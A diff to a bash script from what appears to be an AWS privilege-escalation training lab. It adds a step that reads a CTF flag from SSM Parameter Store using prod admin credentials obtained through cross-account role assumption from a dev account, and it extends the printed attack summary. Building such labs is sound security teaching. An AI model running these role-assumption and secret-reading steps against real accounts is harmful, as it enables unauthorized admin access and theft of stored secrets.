@@ -211,17 +211,37 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 7: Capture the CTF flag from SSM Parameter Store
+echo -e "${YELLOW}Step 7: Capturing the CTF flag${NC}"
+# Still operating with prod admin role credentials from the assume-role step
+export AWS_REGION=$AWS_REGION
+echo "Reading flag from SSM Parameter Store in prod account..."
+
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/dev-to-prod-simple-role-assumption-to-admin --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter \
+    --name /pathfinding-labs/flags/dev-to-prod-simple-role-assumption-to-admin \
+    --query 'Parameter.Value' \
+    --output text)
+
+if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" == "None" ]; then
+    echo -e "${RED}✗ Failed to read CTF flag from SSM${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✓ FLAG CAPTURED: $FLAG_VALUE${NC}\n"
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_DEV in dev account ($DEV_ACCOUNT_ID)"
 echo "2. Assumed role: $TARGET_ROLE_PROD in prod account ($PROD_ACCOUNT_ID)"
 echo "3. Achieved: Administrative access in prod account"
+echo "4. Captured: CTF flag from SSM Parameter Store"
 
 echo -e "\n${YELLOW}Cross-Account Attack Path:${NC}"
 echo "dev:$STARTING_USER_DEV → (sts:AssumeRole) → prod:$TARGET_ROLE_PROD → admin access"
@@ -237,7 +257,7 @@ echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- No persistent artifacts created"
 echo "- Role assumption created temporary session credentials that will expire"
 
-echo -e "\n${BLUE}ℹ This demonstrates a cross-account privilege escalation path${NC}"
+echo -e "\n${BLUE}i This demonstrates a cross-account privilege escalation path${NC}"
 echo -e "${BLUE}An attacker with dev account credentials can gain admin access to prod${NC}"
 
 echo -e "\n${YELLOW}To clean up (no cleanup needed for this scenario):${NC}"
